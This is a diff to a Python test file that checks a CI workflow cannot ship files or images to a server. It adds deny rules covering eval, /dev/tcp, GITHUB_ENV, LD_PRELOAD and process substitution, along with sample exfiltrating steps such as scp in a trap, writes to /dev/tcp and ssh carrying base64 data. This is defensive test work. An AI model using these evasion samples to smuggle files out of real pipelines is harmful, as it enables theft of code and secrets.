@@ -73,23 +73,46 @@ UNSAFE_OPERATORS = re.compile(r";|\|\||(?<![&|])\|(?!\|)|(?<![&>])&(?![&>])")
 IMAGE_IMPORTS = (("pull",), ("load",), ("import",), ("tag",), ("image", "pull"),
                  ("image", "load"), ("image", "import"), ("image", "tag"))
 # The workflow's steps may run only these commands: they work on the runner or, for `ssh` and
-# `curl`, reach another host without sending it files. A command outside the list fails the
-# check, since the check cannot tell that it sends nothing; adding one is a change of this check.
-WORKFLOW_COMMANDS = ("set", "umask", "trap", "printf", "echo", "base64", "chmod", "mkdir", "rm",
+# `curl`, reach another host without sending it files. A command, builtin or construct outside
+# the list fails the check — `eval`, `source`, `.`, `bash -c`, `sh -c`, `env`, `xargs` and any
+# program not named here among them — since the check cannot tell that it sends nothing; adding
+# one is a change of this check. `trap` is read through its action, which must pass the same rules.
+WORKFLOW_COMMANDS = ("set", "umask", "printf", "echo", "base64", "chmod", "mkdir", "rm",
                      "test", "[", "[[", "exit", "return", "sleep", "local", "true", "false", ":",
                      "for", "case", "ssh", "curl")
+TRAP = "trap"
 WORKFLOW_SHELLS = ("bash", "sh")
+# Variables that make the shell or the runner run something else, as YAML `env` keys or as
+# assignments in a step.
+RUN_CHANGING_VARIABLES = ("BASH_ENV", "ENV", "PATH", "LD_PRELOAD", "LD_LIBRARY_PATH",
+                          "PROMPT_COMMAND", "SHELLOPTS", "BASHOPTS", "IFS")
+RUN_CHANGING_ASSIGNMENT = re.compile(r"(?<![\w$])(?:" + "|".join(RUN_CHANGING_VARIABLES)
+                                     + r")\+?=")
+# Text of a step that reaches past its commands: files that change later steps' environment or
+# PATH, bash's network pseudo-files, and expressions GitHub puts into the script before it runs.
+RUN_FORBIDDEN_TEXT = (
+    (re.compile(r"GITHUB_ENV|GITHUB_PATH"), "writes the environment or PATH of later steps"),
+    (re.compile(r"/dev/(?:tcp|udp)/"), "opens a network connection through a redirection"),
+    (re.compile(r"\$\{\{"), "holds a GitHub expression, put into the script before it runs"),
+)
+# Constructs outside quotes that feed a command or run one where the command reader does not
+# look: heredocs and here-strings, and process substitution.
+RUN_FORBIDDEN_CONSTRUCTS = (
+    (re.compile(r"<<"), "feeds a command through a heredoc or here-string"),
+    (re.compile(r"[<>]\("), "runs a command through process substitution"),
+)
 # Options with which curl sends data or a file, or takes its options from a file.
 CURL_SENDING = re.compile(r"^(?:--upload-file|--data(?:-[\w-]+)?|--form(?:-[\w-]+)?|--json|"
                           r"--config|--request|--url-query)(?:=.*)?$")
 CURL_SENDING_SHORT = set("TdFKX")
 # Options with which ssh runs a local command or reads a configuration file.
 SSH_LOCAL = re.compile(r"(?i)(?:ProxyCommand|LocalCommand|PermitLocalCommand|KnownHostsCommand)")
-# ssh fed through a pipe, a redirection or a heredoc.
+# ssh fed through a pipe or a redirection.
 SSH_STDIN = (
     re.compile(r"\|\s*ssh(?![\w.-])"),
-    re.compile(r"(?<![\w./-])ssh(?![\w.-])[^\n]*?(?:<<|(?<![<\d])<(?![<(]))"),
+    re.compile(r"(?<![\w./-])ssh(?![\w.-])[^\n]*?(?<![<\d])<(?![<(])"),
 )
+TRAP_DEPTH = 2
 
 
 def append_type_error(copy):
@@ -218,33 +241,106 @@ ORDER_EXPECTED = [
 ]
 
 
+def outside_single_quotes(code):
+    """A line of shell code with the text inside single quotes (outside double quotes) blanked;
+    double-quoted text stays, since `$(...)` and the like run inside it."""
+    result, quote, index = [], None, 0
+    while index < len(code):
+        char = code[index]
+        if quote == "'":
+            if char == "'":
+                quote = None
+            result.append(char if quote is None else " ")
+        elif quote == '"':
+            if char == "\\":
+                result.append(code[index:index + 2])
+                index += 2
+                continue
+            if char == '"':
+                quote = None
+            result.append(char)
+        else:
+            if char == "\\":
+                result.append(code[index:index + 2])
+                index += 2
+                continue
+            if char in "\"'":
+                quote = char
+            result.append(char)
+        index += 1
+    return "".join(result)
+
+
+def curl_sends(word):
+    if CURL_SENDING.match(word):
+        return True
+    if word.startswith("-") and not word.startswith("--"):
+        letters = re.match(r"-([A-Za-z]*)", word).group(1)
+        return bool(set(letters) & CURL_SENDING_SHORT)
+    return False
+
+
+def run_shipping(script, first_line, depth=0):
+    """What in the text of a `run:` step (its first line at `first_line` of the workflow) could
+    ship files or run what this check does not read."""
+    problems = []
+    for pattern, what in RUN_FORBIDDEN_TEXT:
+        if pattern.search(script):
+            problems.append(f"line {first_line}: the step {what}")
+    if RUN_CHANGING_ASSIGNMENT.search(script):
+        problems.append(f"line {first_line}: the step sets a variable that changes what runs")
+    for line, code in support._logical_lines(script):
+        for pattern, what in RUN_FORBIDDEN_CONSTRUCTS:
+            if pattern.search(outside_single_quotes(code)):
+                problems.append(f"line {first_line + line - 1}: the step {what}: {code.strip()}")
+    functions = support.shell_functions(script)
+    for line, words in support.shell_commands(script):
+        where = f"line {first_line + line - 1}"
+        name = words[0]
+        if name == TRAP:
+            actions = [w for w in words[1:] if not w.startswith("-")][:1]
+            if depth >= TRAP_DEPTH:
+                problems.append(f"{where}: a trap inside a trap: {' '.join(words)}")
+            for action in actions:
+                problems += run_shipping(action, first_line + line - 1, depth + 1)
+        elif name not in WORKFLOW_COMMANDS and name not in functions:
+            problems.append(f"{where}: command `{name}` is not one this check reads as "
+                            f"sending nothing: {' '.join(words)}")
+        elif name == "curl" and any(curl_sends(w) for w in words[1:]):
+            problems.append(f"{where}: curl sends data: {' '.join(words)}")
+        elif name == "ssh" and any(SSH_LOCAL.search(w) or w == "-F" for w in words[1:]):
+            problems.append(f"{where}: ssh runs a local command: {' '.join(words)}")
+        elif name == "ssh" and any("__SUBSTITUTION__" in w for w in words[1:]):
+            problems.append(f"{where}: ssh sends the output of a command: {' '.join(words)}")
+    joined = re.sub(r"\\\n", " ", script)
+    problems += [f"line {first_line}: ssh is fed files: {line.strip()}"
+                 for line in joined.splitlines()
+                 if any(p.search(outside_single_quotes(line)) for p in SSH_STDIN)]
+    return problems
+
+
 def workflow_shipping(text):
-    """What in a workflow could ship files or images to another host: any `uses:` (an action, or
-    a reusable workflow, does what the repository does not show), a `shell:` other than bash or
-    sh, a command of a `run:` step outside WORKFLOW_COMMANDS and the functions that step defines,
-    curl with an option that sends data, and ssh fed through its input or running a local
-    command."""
+    """What in a workflow could ship files or images to another host. The workflow must be in the
+    plain YAML subset `support.strict_workflow` reads, or that reader fails. Then: any `uses:`
+    (an action, or a reusable workflow, does what the repository does not show), a `shell:`
+    other than bash or sh, an `env` key that changes what runs, and in each `run:` step what
+    `run_shipping` finds."""
     problems = [f"line {n}: uses: {v}" for n, _k, v in support.workflow_keys(text, ("uses",))]
     problems += [f"line {n}: shell: {v}" for n, _k, v in support.workflow_keys(text, ("shell",))
-                 if v.split()[0] not in WORKFLOW_SHELLS]
+                 if v.strip() not in WORKFLOW_SHELLS]
+    problems += [f"line {n}: {k} is set" for n, k, _v in
+                 support.workflow_keys(text, RUN_CHANGING_VARIABLES)]
     for number, _key, script in support.workflow_keys(text, ("run",)):
-        functions = support.shell_functions(script)
-        for line, words in support.shell_commands(script):
-            where = f"line {number + line - 1}"
-            name = words[0]
-            if name not in WORKFLOW_COMMANDS and name not in functions:
-                problems.append(f"{where}: command `{name}` is not one this check reads as "
-                                f"sending nothing: {' '.join(words)}")
-            elif name == "curl" and any(
-                    CURL_SENDING.match(w) or re.fullmatch(r"-[A-Za-z]+", w)
-                    and set(w[1:]) & CURL_SENDING_SHORT for w in words[1:]):
-                problems.append(f"{where}: curl sends data: {' '.join(words)}")
-            elif name == "ssh" and any(SSH_LOCAL.search(w) or w == "-F" for w in words[1:]):
-                problems.append(f"{where}: ssh runs a local command: {' '.join(words)}")
-        joined = re.sub(r"\\\n", " ", script)
-        problems += [f"line {number}: ssh is fed files: {line.strip()}"
-                     for line in joined.splitlines() if any(p.search(line) for p in SSH_STDIN)]
+        problems += run_shipping(script, number)
     return problems
+
+
+def workflow_problems(text):
+    """workflow_shipping, with a workflow the reader refuses reported as a problem."""
+    try:
+        return workflow_shipping(text)
+    except AssertionError as error:
+        return [f"not read: {error}"]
 
 
 # A made-up workflow that ships nothing, and steps each of which ships files.
@@ -258,6 +354,7 @@ jobs:
       - name: Deploy
         run: |
           set -euo pipefail
+          trap 'rm -f "$RUNNER_TEMP/key"' EXIT
           printf '%s' "$KEY" | base64 -d > "$RUNNER_TEMP/key"
           ssh -i "$RUNNER_TEMP/key" -o BatchMode=yes "$USER@$HOST" "$SHA"
       - name: Probe
@@ -282,6 +379,19 @@ SHIPPING_STEPS = (
     "      - run: ssh -o ProxyCommand='scp dist host:' \"$USER@$HOST\" \"$SHA\"\n",
     "      - run: docker push ghcr.io/x/loop2\n",
     "      - shell: python {0}\n        run: print('a')\n",
+    "      - \"uses\": appleboy/scp-action@v0.1.7\n        with:\n          source: dist\n",
+    "      - { name: Copy, uses: appleboy/scp-action@v0.1.7, with: { source: dist } }\n",
+    "      - run: |\n          trap 'scp dist.tgz \"$USER@$HOST:/srv/loop2/\"' EXIT\n",
+    "      - run: |\n          echo \"BASH_ENV=$RUNNER_TEMP/x\" >> \"$GITHUB_ENV\"\n",
+    "      - run: |\n          diff <(scp dist \"$USER@$HOST:/srv/\") /dev/null\n",
+    "      - run: |\n          curl -sS \"$URL\" -o /dev/null <<< \"$(base64 dist.tgz)\"\n",
+    "      - run: |\n          printf '%s' x > /dev/tcp/example.org/80\n",
+    "      - run: |\n          eval \"scp dist host:\"\n",
+    "      - run: |\n          bash -c 'scp dist host:'\n",
+    "      - run: ${{ format('scp {0} host:', 'dist') }}\n",
+    "      - run: |\n          ssh host \"$(base64 -w0 dist.tgz)\"\n",
+    "      - uses: &copy appleboy/scp-action@v0.1.7\n",
+    "    env:\n      PATH: /tmp/bin\n",
 )
 
 
@@ -375,15 +485,16 @@ class ServingImageBuiltOnlyAfterTypecheck(unittest.TestCase):
     def test_workflow_ships_no_files(self):
         # invariant: account-server-typecheck/1
         text = support.read_required(WORKFLOW)
-        problems = workflow_shipping(text)
-        self.assertEqual(problems, [], f"{WORKFLOW} can ship files or images to the server")
+        problems = workflow_problems(text)
+        self.assertEqual(problems, [], f"{WORKFLOW} can ship files or images to the server, or "
+                                       "is written in a form this check does not read")
 
     def test_workflow_reader_refuses_file_copying_steps(self):
         # invariant: account-server-typecheck/1
-        self.assertEqual(workflow_shipping(SAFE_WORKFLOW), [])
+        self.assertEqual(workflow_problems(SAFE_WORKFLOW), [])
         for step in SHIPPING_STEPS:
             with self.subTest(step=step):
-                self.assertNotEqual(workflow_shipping(SAFE_WORKFLOW + step), [],
+                self.assertNotEqual(workflow_problems(SAFE_WORKFLOW + step), [],
                                     "a step that ships files passes")
 
     def test_no_other_deployment_route(self):
